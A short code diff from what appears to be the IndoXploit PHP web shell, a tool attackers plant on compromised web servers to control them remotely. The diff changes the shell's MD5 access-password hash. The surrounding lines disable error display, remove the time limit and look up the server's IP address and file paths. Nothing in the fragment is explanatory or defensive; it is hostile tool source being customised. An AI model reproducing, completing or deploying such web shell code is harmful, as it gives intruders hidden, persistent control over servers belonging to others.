@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "7b4939a8af28c814f0c757bb10f40d3d"; # md5: IndoXploit
+$password = "900bc885d7553375aec470198a9514f3"; # md5: IndoXploit
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
